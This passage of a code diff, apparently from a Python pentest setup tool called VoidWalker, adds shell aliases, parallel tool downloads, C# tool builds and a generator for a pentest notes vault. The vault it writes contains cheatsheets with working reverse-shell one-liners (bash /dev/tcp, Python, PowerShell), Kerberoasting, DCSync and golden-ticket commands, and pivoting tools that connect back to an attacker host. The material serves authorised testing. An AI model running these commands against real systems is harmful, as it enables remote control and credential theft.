+        """Download a .gz file and decompress it to dest_file."""
+        try:
+            dest_file.parent.mkdir(parents=True, exist_ok=True)
+            with tempfile.NamedTemporaryFile(suffix='.gz', delete=False) as tmp:
+                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+                with urllib.request.urlopen(req, timeout=120) as resp:
+                    tmp.write(resp.read())
+                tmp_path = Path(tmp.name)
+
+            with gzip.open(tmp_path, 'rb') as f_in:
+                with open(dest_file, 'wb') as f_out:
+                    f_out.write(f_in.read())
+
+            tmp_path.unlink(missing_ok=True)
+            if dest_file.exists():
+                dest_file.chmod(0o755)
+            return dest_file.exists()
+        except Exception:
+            return False
+
     def extract_rockyou(self):
         """Extract rockyou.txt wordlist if it's compressed."""
         rockyou_gz = Path("/usr/share/wordlists/rockyou.txt.gz")
@@ -1316,8 +2431,10 @@ class VoidWalker:
         elif rockyou_txt.exists():
             print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} rockyou.txt already available{Colors.RESET}")
 
-    def create_bash_aliases(self):
-        """Create useful bash aliases for penetration testing."""
+    def create_shell_aliases(self):
+        """Create useful shell aliases for penetration testing.
+        Uses ~/.zshrc on macOS, ~/.bash_aliases on Linux.
+        """
         aliases_content = """# VoidWalker HTB Tools Aliases
 # Generated by VoidWalker v{}
 
@@ -1325,9 +2442,7 @@ class VoidWalker:
 alias ll='ls -alh'
 alias www='python3 -m http.server 80'
 alias wwwphp='php -S 0.0.0.0:80'
-alias ports='netstat -tulpn'
-alias myip='ip -4 addr | grep -oP \"(?<=inet\\s)\\d+(\.\\d+){{3}}\"'
-alias nse='ls /usr/share/nmap/scripts/ | grep '
+alias pyserve='python3 -m http.server'
 
 # Impacket Shortcuts
 alias impacket-secretsdump='impacket-secretsdump'
@@ -1348,14 +2463,8 @@ alias enum-smb='enum4linux -a'
 alias enum-ldap='ldapsearch -x -h'
 alias enum-dns='dnsenum'
 
-# Web Enumeration
-alias ffuf-dir='ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u'
-alias ffuf-vhost='ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u'
-alias gobust-dir='gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u'
-
 # File Transfer
 alias getfile='wget'
-alias pyserve='python3 -m http.server'
 alias smbserve='impacket-smbserver share . -smb2support'
 
 # Reverse Shells
@@ -1366,13 +2475,20 @@ alias kerb-users='impacket-GetNPUsers -dc-ip'
 alias kerb-tgt='impacket-getTGT -dc-ip'
 
 # Misc
-alias linenum='bash ~/voidwalker/tools/linux/enum/LinEnum.sh'
-alias linpeas='bash ~/voidwalker/tools/linux/enum/linpeas.sh'
-alias pspy='~/voidwalker/tools/linux/enum/pspy64'
+alias linpeas='bash ~/voidwalker/tools/linux/privesc/linpeas.sh'
+alias pspy='~/voidwalker/tools/linux/enum/linux/pspy64'
 """.format(__version__)
 
         try:
-            aliases_path = Path.home() / ".bash_aliases"
+            # On macOS use ~/.zshrc, on Linux use ~/.bash_aliases
+            if self.is_macos:
+                aliases_path = Path.home() / ".zshrc"
+                shell_name = "zsh"
+                source_cmd = "source ~/.zshrc"
+            else:
+                aliases_path = Path.home() / ".bash_aliases"
+                shell_name = "bash"
+                source_cmd = "source ~/.bash_aliases"
 
             # Read existing content if file exists
             existing_content = ""
@@ -1384,12 +2500,793 @@ alias pspy='~/voidwalker/tools/linux/enum/pspy64'
             if "VoidWalker HTB Tools Aliases" not in existing_content:
                 with open(aliases_path, 'a') as f:
                     f.write("\n" + aliases_content)
-                print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} Bash aliases created at ~/.bash_aliases{Colors.RESET}")
-                print(f"  {Colors.YELLOW}Run 'source ~/.bash_aliases' to activate{Colors.RESET}")
+                print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} Shell aliases created at {aliases_path}{Colors.RESET}")
+                print(f"  {Colors.YELLOW}Run '{source_cmd}' to activate{Colors.RESET}")
             else:
-                print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} Bash aliases already configured{Colors.RESET}")
+                print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} Shell aliases already configured{Colors.RESET}")
         except Exception as e:
             print(f"  {Colors.BRIGHT_RED}{Symbols.CROSS} Failed to create aliases: {e}{Colors.RESET}")
+
+    # Keep old name as alias for backwards compatibility
+    create_bash_aliases = create_shell_aliases
+
+    def setup_obsidian_vault(self):
+        """Create an Obsidian vault directory structure for a penetration testing engagement."""
+        self.clear_screen()
+        self.show_ascii_banner()
+
+        print()
+        self.print_centered(f"{Colors.NEON_MAGENTA}{Symbols.SHIELD} PENTEST OBSIDIAN VAULT SETUP {Symbols.SHIELD}{Colors.RESET}")
+        self.print_centered(f"{Colors.GRAY}{'─' * 60}{Colors.RESET}")
+        print()
+
+        # Prompt for engagement name
+        print(f"  {Colors.NEON_CYAN}Enter engagement name (e.g. 'ACME-Corp-2025'):{Colors.RESET}")
+        engagement_name = input(f"  {Colors.WHITE}> {Colors.RESET}").strip()
+        if not engagement_name:
+            engagement_name = "Engagement"
+        print()
+
+        vault_path = self.base_path / "vault" / engagement_name
+        if vault_path.exists():
+            print(f"  {Colors.YELLOW}{Symbols.CIRCLE} Vault already exists at {vault_path}{Colors.RESET}")
+            print(f"  {Colors.GRAY}Skipping creation to avoid overwriting.{Colors.RESET}")
+            print()
+            input(f"{Colors.GRAY}Press Enter to continue...{Colors.RESET}")
+            return
+
+        print(f"  {Colors.YELLOW}Creating vault at: {vault_path}{Colors.RESET}")
+        print()
+
+        # ─── Directory Structure ───────────────────────────────────────
+        vault_dirs = [
+            "00-Engagement/Scope",
+            "00-Engagement/Rules-of-Engagement",
+            "01-Reconnaissance/External",
+            "01-Reconnaissance/OSINT",
+            "01-Reconnaissance/Passive",
+            "02-Enumeration/Hosts",
+            "02-Enumeration/Services",
+            "02-Enumeration/Active-Directory",
+            "02-Enumeration/Web-Apps",
+            "02-Enumeration/Shares",
+            "03-Exploitation/Initial-Access",
+            "03-Exploitation/Payloads",
+            "03-Exploitation/Phishing",
+            "04-Post-Exploitation/Privilege-Escalation",
+            "04-Post-Exploitation/Lateral-Movement",
+            "04-Post-Exploitation/Persistence",
+            "04-Post-Exploitation/Domain-Escalation",
+            "05-Credentials/Hashes",
+            "05-Credentials/Passwords",
+            "05-Credentials/Tickets",
+            "05-Credentials/Certificates",
+            "06-Loot/Screenshots",
+            "06-Loot/Data",
+            "06-Loot/Configs",
+            "07-Findings",
+            "08-Report/Drafts",
+            "08-Report/Evidence",
+            "09-Daily-Log",
+            "Templates",
+            "Cheatsheets",
+            "Attachments",
+        ]
+
+        for d in vault_dirs:
+            (vault_path / d).mkdir(parents=True, exist_ok=True)
+
+        print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} Directory structure created ({len(vault_dirs)} folders){Colors.RESET}")
+
+        # ─── .obsidian config ──────────────────────────────────────────
+        obsidian_dir = vault_path / ".obsidian"
+        obsidian_dir.mkdir(exist_ok=True)
+
+        app_config = json.dumps({
+            "alwaysUpdateLinks": True,
+            "attachmentFolderPath": "Attachments",
+            "newFileLocation": "folder",
+            "newFileFolderPath": "02-Enumeration/Hosts",
+            "showLineNumber": True,
+            "strictLineBreaks": False,
+            "readableLineLength": True,
+            "livePreview": True,
+        }, indent=2)
+        (obsidian_dir / "app.json").write_text(app_config)
+
+        appearance_config = json.dumps({
+            "accentColor": "#56949f",
+            "theme": "obsidian",
+            "cssTheme": "",
+        }, indent=2)
+        (obsidian_dir / "appearance.json").write_text(appearance_config)
+
+        print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} Obsidian config created{Colors.RESET}")
+
+        # ─── Templates ─────────────────────────────────────────────────
+        templates = {
+            "Templates/Host.md": f"""---
+hostname: "{{{{hostname}}}}"
+ip: "{{{{ip}}}}"
+os: ""
+status: "alive"
+domain: ""
+engagement: "{engagement_name}"
+date: "{{{{date}}}}"
+tags: [host, enumeration]
+---
+
+# {{{{hostname}}}} ({{{{ip}}}})
+
+## Quick Reference
+
+| Field | Value |
+|-------|-------|
+| IP Address | {{{{ip}}}} |
+| Hostname | {{{{hostname}}}} |
+| OS | |
+| Domain | |
+| Role | |
+
+## Ports & Services
+
+| Port | Service | Version | Notes |
+|------|---------|---------|-------|
+| | | | |
+
+## Enumeration Notes
+
+
+## Credentials Found
+
+| Username | Password/Hash | Source |
+|----------|---------------|--------|
+| | | |
+
+## Exploitation Path
+
+
+## Screenshots
+
+""",
+            "Templates/Finding.md": f"""---
+title: "{{{{title}}}}"
+severity: "Critical|High|Medium|Low|Info"
+cvss: ""
+cve: ""
+affected_hosts: []
+engagement: "{engagement_name}"
+date: "{{{{date}}}}"
+tags: [finding, vulnerability]
+---
+
+# {{{{title}}}}
+
+## Summary
+
+Brief description of the vulnerability.
+
+## Affected Assets
+
+| Host | IP | Service |
+|------|----|---------|
+| | | |
+
+## Risk Rating
+
+| Metric | Value |
+|--------|-------|
+| Severity | |
+| CVSS Score | |
+| CVE | |
+| Exploitability | Easy / Moderate / Difficult |
+| Business Impact | |
+
+## Technical Details
+
+### Proof of Concept
+
+```
+<steps to reproduce>
+```
+
+### Evidence
+
+<!-- Paste screenshots here -->
+
+## Remediation
+
+### Short-term
+
+### Long-term
+
+## References
+
+""",
+            "Templates/Credential.md": f"""---
+username: "{{{{username}}}}"
+type: "password|hash|ticket|certificate"
+source: ""
+engagement: "{engagement_name}"
+date: "{{{{date}}}}"
+tags: [credential]
+---
+
+# Credential: {{{{username}}}}
+
+| Field | Value |
+|-------|-------|
+| Username | {{{{username}}}} |
+| Domain | |
+| Type | password / NTLM / Kerberos / certificate |
+| Value | |
+| Source Host | |
+| Method | |
+| Cracked | Yes / No |
+
+## Usage
+
+```
+# How this credential was used
+```
+
+## Notes
+
+""",
+            "Templates/Daily-Log.md": f"""---
+date: "{{{{date}}}}"
+engagement: "{engagement_name}"
+tags: [daily-log]
+---
+
+# Daily Log — {{{{date}}}}
+
+## Objectives
+
+- [ ] 
+
+## Key Findings
+
+- 
+
+## Hosts Compromised
+
+| Host | Method | Credentials |
+|------|--------|-------------|
+| | | |
+
+## Blocked / Detected
+
+- 
+
+## Tomorrow's Plan
+
+- 
+
+""",
+        }
+
+        for filepath, content in templates.items():
+            target = vault_path / filepath
+            target.write_text(content)
+
+        print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} Templates created (Host, Finding, Credential, Daily-Log){Colors.RESET}")
+
+        # ─── Engagement Dashboard ──────────────────────────────────────
+        dashboard = f"""---
+engagement: "{engagement_name}"
+date: "{{{{date}}}}"
+tags: [dashboard, index]
+---
+
+# 🛡️ {engagement_name} — Engagement Dashboard
+
+## Engagement Info
+
+| Field | Value |
+|-------|-------|
+| Client | |
+| Start Date | |
+| End Date | |
+| Scope | See [[00-Engagement/Scope/Scope]] |
+| Rules of Engagement | See [[00-Engagement/Rules-of-Engagement/RoE]] |
+| Report Due | |
+
+## Progress Tracker
+
+- [ ] Scoping & Rules of Engagement
+- [ ] External Reconnaissance
+- [ ] Network Enumeration
+- [ ] Service Enumeration
+- [ ] Active Directory Enumeration
+- [ ] Web Application Testing
+- [ ] Initial Access
+- [ ] Privilege Escalation
+- [ ] Lateral Movement
+- [ ] Domain Compromise
+- [ ] Data Exfiltration (if in scope)
+- [ ] Cleanup
+- [ ] Report Drafting
+- [ ] Report Delivery
+
+## Hosts
+
+```dataview
+TABLE ip AS "IP", os AS "OS", status AS "Status", domain AS "Domain"
+FROM "02-Enumeration/Hosts"
+WHERE contains(tags, "host")
+SORT ip ASC
+```
+
+## Credentials
+
+```dataview
+TABLE username AS "User", type AS "Type", source AS "Source"
+FROM "05-Credentials"
+WHERE contains(tags, "credential")
+SORT username ASC
+```
+
+## Findings
+
+```dataview
+TABLE severity AS "Severity", cvss AS "CVSS", affected_hosts AS "Hosts"
+FROM "07-Findings"
+WHERE contains(tags, "finding")
+SORT severity ASC
+```
+
+## Daily Logs
+
+```dataview
+LIST
+FROM "09-Daily-Log"
+SORT date DESC
+```
+
+## Quick Links
+
+- [[Cheatsheets/Nmap]]
+- [[Cheatsheets/AD-Attacks]]
+- [[Cheatsheets/Kerberos]]
+- [[Cheatsheets/Pivoting]]
+- [[Cheatsheets/File-Transfer]]
+- [[Cheatsheets/Reverse-Shells]]
+
+"""
+        (vault_path / "Dashboard.md").write_text(dashboard)
+        print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} Engagement dashboard created{Colors.RESET}")
+
+        # ─── Scope & RoE placeholders ──────────────────────────────────
+        scope_content = f"""---
+engagement: "{engagement_name}"
+tags: [scope, engagement]
+---
+
+# Scope — {engagement_name}
+
+## In-Scope
+
+| Type | Target | Notes |
+|------|--------|-------|
+| Network Range | | |
+| Domain | | |
+| Web Application | | |
+| Wireless | | |
+
+## Out-of-Scope
+
+| Type | Target | Reason |
+|------|--------|--------|
+| | | |
+
+## Credentials Provided
+
+| Username | Password | Access Level |
+|----------|----------|-------------|
+| | | |
+
+"""
+        (vault_path / "00-Engagement" / "Scope" / "Scope.md").write_text(scope_content)
+
+        roe_content = f"""---
+engagement: "{engagement_name}"
+tags: [roe, engagement]
+---
+
+# Rules of Engagement — {engagement_name}
+
+## Authorisation
+
+| Field | Value |
+|-------|-------|
+| Authorised By | |
+| Date | |
+| Emergency Contact | |
+| Escalation Process | |
+
+## Permitted Activities
+
+- [ ] Network scanning
+- [ ] Vulnerability scanning
+- [ ] Exploitation
+- [ ] Password attacks
+- [ ] Social engineering
+- [ ] Physical access testing
+- [ ] Denial of Service testing
+- [ ] Data exfiltration
+
+## Restrictions
+
+- 
+
+## Testing Hours
+
+| Day | Start | End |
+|-----|-------|-----|
+| Mon–Fri | | |
+| Weekends | | |
+
+## Communication Plan
+
+- 
+
+"""
+        (vault_path / "00-Engagement" / "Rules-of-Engagement" / "RoE.md").write_text(roe_content)
+        print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} Scope & Rules of Engagement templates created{Colors.RESET}")
+
+        # ─── Cheatsheets ──────────────────────────────────────────────
+        cheatsheets = {
+            "Cheatsheets/Nmap.md": """# Nmap Cheatsheet
+
+## Quick Scans
+```bash
+# Fast port scan
+nmap -T4 -p- --min-rate=1000 <IP>
+
+# Service version + scripts
+nmap -sV -sC -p <PORTS> <IP>
+
+# Full comprehensive
+nmap -p- -sV -sC -A --min-rate=1000 -oA nmap/<IP> <IP>
+
+# UDP scan
+nmap -sU -T4 --top-ports 100 <IP>
+
+# Vulnerability scan
+nmap -sV --script vuln <IP>
+```
+
+## NSE Scripts
+```bash
+# SMB enumeration
+nmap --script smb-enum-shares,smb-enum-users -p445 <IP>
+
+# LDAP
+nmap --script ldap-search -p389 <IP>
+```
+""",
+            "Cheatsheets/AD-Attacks.md": """# Active Directory Attack Cheatsheet
+
+## Enumeration
+```powershell
+# BloodHound
+SharpHound.exe -c All --outputdirectory C:\\temp
+Invoke-BloodHound -CollectionMethod All
+
+# PowerView
+Get-DomainUser -SPN  # Kerberoastable
+Get-DomainUser -PreauthNotRequired  # AS-REP roastable
+Get-DomainGPO | Get-ObjectAcl
+Find-DomainShare -CheckShareAccess
+```
+
+## Kerberos Attacks
+```bash
+# AS-REP Roast
+impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip <DC>
+
+# Kerberoast
+impacket-GetUserSPNs domain.local/user:pass -dc-ip <DC> -request
+
+# Rubeus
+Rubeus.exe kerberoast /outfile:hashes.txt
+Rubeus.exe asreproast /outfile:asrep.txt
+```
+
+## Credential Attacks
+```bash
+# secretsdump
+impacket-secretsdump domain.local/admin:pass@<DC>
+
+# DCSync
+impacket-secretsdump domain.local/admin:pass@<DC> -just-dc-ntlm
+```
+""",
+            "Cheatsheets/Kerberos.md": """# Kerberos Cheatsheet
+
+## Ticket Operations
+```bash
+# Request TGT
+impacket-getTGT domain.local/user:pass -dc-ip <DC>
+
+# Pass the Ticket
+export KRB5CCNAME=user.ccache
+impacket-psexec domain.local/user@<TARGET> -k -no-pass
+
+# Silver Ticket
+impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain domain.local -spn cifs/<TARGET> admin
+
+# Golden Ticket
+impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain domain.local admin
+```
+""",
+            "Cheatsheets/Pivoting.md": """# Pivoting Cheatsheet
+
+## Chisel
+```bash
+# Server (attacker)
+chisel server --reverse --port 8080
+
+# Client (target)
+chisel client <ATTACKER>:8080 R:socks
+```
+
+## Ligolo-ng
+```bash
+# Proxy (attacker)
+ligolo-ng -selfcert
+
+# Agent (target)
+ligolo-ng_agent -connect <ATTACKER>:11601 -retry -ignore-cert
+```
+
+## SSH Tunnels
+```bash
+# Local port forward
+ssh -L <LOCAL_PORT>:<TARGET>:<TARGET_PORT> user@<PIVOT>
+
+# Dynamic SOCKS proxy
+ssh -D 1080 user@<PIVOT>
+
+# Remote port forward
+ssh -R <REMOTE_PORT>:localhost:<LOCAL_PORT> user@<PIVOT>
+```
+""",
+            "Cheatsheets/File-Transfer.md": """# File Transfer Cheatsheet
+
+## Python HTTP Server
+```bash
+python3 -m http.server 80
+```
+
+## PowerShell Download
+```powershell
+iwr http://<IP>/file -OutFile C:\\temp\\file
+(New-Object Net.WebClient).DownloadFile('http://<IP>/file','C:\\temp\\file')
+certutil -urlcache -f http://<IP>/file C:\\temp\\file
+```
+
+## Linux Download
+```bash
+wget http://<IP>/file
+curl http://<IP>/file -o file
+```
+
+## SMB
+```bash
+# Server
+impacket-smbserver share . -smb2support
+
+# Client (Windows)
+copy \\\\<IP>\\share\\file C:\\temp\\file
+```
+""",
+            "Cheatsheets/Reverse-Shells.md": """# Reverse Shell Cheatsheet
+
+## Bash
+```bash
+bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+```
+
+## Python
+```bash
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+```
+
+## PowerShell
+```powershell
+powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+## Stabilise Shell
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+```
+""",
+        }
+
+        for filepath, content in cheatsheets.items():
+            target = vault_path / filepath
+            target.write_text(content)
+
+        print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} Cheatsheets created ({len(cheatsheets)} sheets){Colors.RESET}")
+
+        # ─── Sources, Guides & References ─────────────────────────────
+        sources_content = """---
+tags: [sources, guides, references]
+---
+
+# Sources, Guides & Cheatsheets
+
+"""
+        for section, entries in SOURCES_AND_GUIDES.items():
+            sources_content += f"## {section}\n\n"
+            sources_content += "| Name | URL |\n|------|-----|\n"
+            for name, url in entries:
+                sources_content += f"| {name} | {url} |\n"
+            sources_content += "\n"
+
+        (vault_path / "Cheatsheets" / "Sources-and-Guides.md").write_text(sources_content)
+        print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} Sources & Guides reference page created{Colors.RESET}")
+
+        # ─── Summary ──────────────────────────────────────────────────
+        print()
+        total_files = len(templates) + len(cheatsheets) + 4  # +4 for dashboard, scope, roe, configs
+        stats = [
+            f"{Colors.NEON_GREEN}{Symbols.CHECK} Vault: {vault_path}{Colors.RESET}",
+            f"{Colors.NEON_GREEN}{Symbols.CHECK} Folders: {len(vault_dirs)}{Colors.RESET}",
+            f"{Colors.NEON_GREEN}{Symbols.CHECK} Templates: {len(templates)}{Colors.RESET}",
+            f"{Colors.NEON_GREEN}{Symbols.CHECK} Cheatsheets: {len(cheatsheets)}{Colors.RESET}",
+            f"{Colors.ELECTRIC_BLUE}Open in Obsidian: File → Open vault → {vault_path}{Colors.RESET}",
+        ]
+        self.draw_box(f"{Symbols.SHIELD} VAULT READY", stats, 55)
+        print()
+        input(f"{Colors.GRAY}Press Enter to continue...{Colors.RESET}")
+
+    def build_dotnet_tool(self, name: str, config: Dict) -> bool:
+        """Build a single C# tool from source using dotnet build.
+
+        Args:
+            name: Tool name (e.g. "Rubeus")
+            config: Dict with keys: repo, framework, type (sln|csproj), description
+        Returns:
+            True if build succeeded, False otherwise
+        """
+        try:
+            src_dir = self.base_path / "tools" / "build-src" / name
+            out_dir = self.base_path / "tools" / "windows" / "compiled" / name
+            out_dir.mkdir(parents=True, exist_ok=True)
+
+            # Clone or update repo
+            if src_dir.exists():
+                self.run_cmd(["git", "-C", str(src_dir), "pull", "--ff-only"])
+            else:
+                if not self.git_clone(config["repo"], src_dir):
+                    return False
+
+            # Find the build file (.sln or .csproj)
+            build_ext = ".sln" if config["type"] == "sln" else ".csproj"
+            build_file = None
+
+            # Search root first, then one level deep
+            for f in src_dir.glob(f"*{build_ext}"):
+                build_file = f
+                break
+            if not build_file:
+                for f in src_dir.glob(f"*/*{build_ext}"):
+                    build_file = f
+                    break
+
+            if not build_file:
+                return False
+
+            # Restore NuGet packages
+            self.run_cmd(["dotnet", "restore", str(build_file)])
+
+            # Build
+            build_result = self.run_cmd([
+                "dotnet", "build", str(build_file),
+                "-c", "Release",
+                "--no-restore",
+            ])
+
+            if not build_result:
+                # Fallback: try without --no-restore
+                build_result = self.run_cmd([
+                    "dotnet", "build", str(build_file),
+                    "-c", "Release",
+                ])
+
+            if not build_result:
+                return False
+
+            # Collect compiled binaries
+            compiled_count = 0
+            for exe in src_dir.rglob("bin/Release/**/*.exe"):
+                dest = out_dir / exe.name
+                shutil.copy2(str(exe), str(dest))
+                compiled_count += 1
+            for dll in src_dir.rglob("bin/Release/**/*.dll"):
+                # Only copy DLLs that match the tool name (not all dependencies)
+                if name.lower() in dll.name.lower():
+                    dest = out_dir / dll.name
+                    shutil.copy2(str(dll), str(dest))
+                    compiled_count += 1
+
+            return compiled_count > 0
+
+        except Exception:
+            return False
+
+    def build_all_tools(self):
+        """Clone and build all C# tools from BUILD_TARGETS."""
+        self.clear_screen()
+        self.show_ascii_banner()
+
+        print()
+        self.print_centered(f"{Colors.NEON_MAGENTA}{Symbols.GEAR} BUILD C# TOOLS FROM SOURCE {Symbols.GEAR}{Colors.RESET}")
+        self.print_centered(f"{Colors.GRAY}{'─' * 60}{Colors.RESET}")
+        print()
+
+        # Check for dotnet SDK
+        dotnet_available = self.run_cmd(["dotnet", "--version"])
+        if not dotnet_available:
+            print(f"  {Colors.BRIGHT_RED}{Symbols.CROSS} .NET SDK not found!{Colors.RESET}")
+            print()
+            print(f"  {Colors.YELLOW}Install the .NET SDK first:{Colors.RESET}")
+            if self.is_macos:
+                print(f"  {Colors.WHITE}  brew install dotnet-sdk{Colors.RESET}")
+            else:
+                print(f"  {Colors.WHITE}  sudo apt-get install -y dotnet-sdk-8.0{Colors.RESET}")
+                print(f"  {Colors.WHITE}  — or —{Colors.RESET}")
+                print(f"  {Colors.WHITE}  wget https://dot.net/v1/dotnet-install.sh && bash dotnet-install.sh{Colors.RESET}")
+            print()
+            print(f"  {Colors.GRAY}See BUILD_GUIDE.md for detailed instructions.{Colors.RESET}")
+            print()
+            input(f"{Colors.GRAY}Press Enter to continue...{Colors.RESET}")
+            return
+
+        print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} .NET SDK detected{Colors.RESET}")
+        print()
+
+        # Create directories
+        src_dir = self.base_path / "tools" / "build-src"
+        out_dir = self.base_path / "tools" / "windows" / "compiled"
+        src_dir.mkdir(parents=True, exist_ok=True)
+        out_dir.mkdir(parents=True, exist_ok=True)
+
+        build_success, build_fail = 0, 0
+        total_targets = len(BUILD_TARGETS)
+
+        for i, (name, config) in enumerate(BUILD_TARGETS.items(), 1):
+            desc = config.get("description", "")
+            self.show_live_status("Building", i, total_targets, f"{name} ({desc[:20]})", "compiling")
+
+            if self.build_dotnet_tool(name, config):
+                build_success += 1
+                self.stats["ok"] += 1
+            else:
+                build_fail += 1
+                self.stats["fail"] += 1
+
+        self.complete_status_line("C# Build", build_success, build_fail)
+        print()
+
+        if build_success > 0:
+            print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} Compiled binaries saved to:{Colors.RESET}")
+            print(f"  {Colors.WHITE}  {out_dir}{Colors.RESET}")
+            print()
+
+        if build_fail > 0:
+            print(f"  {Colors.YELLOW}{Symbols.CIRCLE} {build_fail} tools failed to build.{Colors.RESET}")
+            print(f"  {Colors.GRAY}See BUILD_GUIDE.md for manual compilation steps.{Colors.RESET}")
+            print()
+
+        self.show_summary()
 
     def install_windows_binaries(self):
         self.clear_screen()
@@ -1405,45 +3302,59 @@ alias pspy='~/voidwalker/tools/linux/enum/pspy64'
         tools = data.get("tools", [])
         repos = data.get("repos", [])
         
+        # --- Precompiled Binaries ---
         bin_success, bin_fail = 0, 0
         total_tools = len(tools)
         
-        for i, (name, method, url, desc) in enumerate(tools, 1):
-            self.show_live_status("Windows Binaries", i, total_tools, name, "downloading")
-            
-            success = False
-            if method == "file":
-                success = self.download_with_animation(name, self.download_file, url, tools_dir / "precompiled" / name)
-            elif method == "zip":
-                success = self.download_with_animation(name, self.download_and_extract_zip, url, tools_dir / name.lower())
-            elif method == "git":
-                success = self.download_with_animation(name, self.git_clone, url, tools_dir / name)
-            
-            if success:
-                bin_success += 1
-                self.stats["ok"] += 1
-            else:
-                bin_fail += 1
-                self.stats["fail"] += 1
+        def download_bin(item):
+            name, method, url, desc = item
+            if method == "file": return self.download_file(url, tools_dir / "precompiled" / name)
+            elif method == "zip": return self.download_and_extract_zip(url, tools_dir / name.lower())
+            elif method == "git": return self.git_clone(url, tools_dir / name)
+            return False
+
+        if total_tools > 0:
+            completed_bin = 0
+            self.show_live_status("Windows Binaries", 0, total_tools, "Starting threads...", "downloading")
+            with ThreadPoolExecutor(max_workers=10) as executor:
+                future_to_bin = {executor.submit(download_bin, t): t for t in tools}
+                for future in as_completed(future_to_bin):
+                    completed_bin += 1
+                    if future.result():
+                        bin_success += 1
+                        self.stats["ok"] += 1
+                    else:
+                        bin_fail += 1
+                        self.stats["fail"] += 1
+                    self.show_live_status("Windows Binaries", completed_bin, total_tools, f"Downloading {completed_bin}/{total_tools}", "downloading")
+            self.complete_status_line("Windows Binaries", bin_success, bin_fail)
+            print()
         
-        self.complete_status_line("Windows Binaries", bin_success, bin_fail)
-        print()
-        
+        # --- Git Repositories ---
         repo_success, repo_fail = 0, 0
         total_repos = len(repos)
         
-        for i, (name, url) in enumerate(repos, 1):
-            self.show_live_status("Git Repositories", i, total_repos, name, "cloning")
+        def clone_repo(item):
+            name, url = item
+            return self.git_clone(url, tools_dir / name)
+
+        if total_repos > 0:
+            completed_repo = 0
+            self.show_live_status("Git Repositories", 0, total_repos, "Starting threads...", "cloning")
+            with ThreadPoolExecutor(max_workers=10) as executor:
+                future_to_repo = {executor.submit(clone_repo, r): r for r in repos}
+                for future in as_completed(future_to_repo):
+                    completed_repo += 1
+                    if future.result():
+                        repo_success += 1
+                        self.stats["ok"] += 1
+                    else:
+                        repo_fail += 1
+                        self.stats["fail"] += 1
+                    self.show_live_status("Git Repositories", completed_repo, total_repos, f"Cloning {completed_repo}/{total_repos}", "cloning")
+            self.complete_status_line("Git Repositories", repo_success, repo_fail)
+            print()
             
-            if self.download_with_animation(name, self.git_clone, url, tools_dir / name):
-                repo_success += 1
-                self.stats["ok"] += 1
-            else:
-                repo_fail += 1
-                self.stats["fail"] += 1
-        
-        self.complete_status_line("Git Repositories", repo_success, repo_fail)
-        print()
         self.show_summary()
 
     def install_category(self, category: str):
@@ -1472,29 +3383,33 @@ alias pspy='~/voidwalker/tools/linux/enum/pspy64'
         total_items = len(all_items)
         short_name = category[:18] if len(category) > 18 else category
         
-        for i, (item_type, name, method, url) in enumerate(all_items, 1):
-            status_type = "cloning" if item_type == 'repo' else "downloading"
-            self.show_live_status(short_name, i, total_items, name, status_type)
-            
-            success = False
+        def download_worker(item):
+            item_type, name, method, url = item
             if item_type == 'tool':
-                if method == "file":
-                    success = self.download_with_animation(name, self.download_file, url, dest / name)
-                elif method == "zip":
-                    success = self.download_with_animation(name, self.download_and_extract_zip, url, dest / name.lower())
-                elif method == "git":
-                    success = self.download_with_animation(name, self.git_clone, url, dest / name)
+                if method == "file": return self.download_file(url, dest / name)
+                elif method == "zip": return self.download_and_extract_zip(url, dest / name.lower())
+                elif method == "git": return self.git_clone(url, dest / name)
             elif item_type == 'file':
-                success = self.download_with_animation(name, self.download_file, url, dest / name)
+                return self.download_file(url, dest / name)
             elif item_type == 'repo':
-                success = self.download_with_animation(name, self.git_clone, url, dest / name)
-            
-            if success:
-                cat_success += 1
-                self.stats["ok"] += 1
-            else:
-                cat_fail += 1
-                self.stats["fail"] += 1
+                return self.git_clone(url, dest / name)
+            return False
+
+        completed = 0
+        self.show_live_status(short_name, completed, total_items, "Starting threads...", "downloading")
+        
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            future_to_item = {executor.submit(download_worker, item): item for item in all_items}
+            for future in as_completed(future_to_item):
+                completed += 1
+                if future.result():
+                    cat_success += 1
+                    self.stats["ok"] += 1
+                else:
+                    cat_fail += 1
+                    self.stats["fail"] += 1
+                
+                self.show_live_status(short_name, completed, total_items, f"Processing {completed}/{total_items}", "downloading")
         
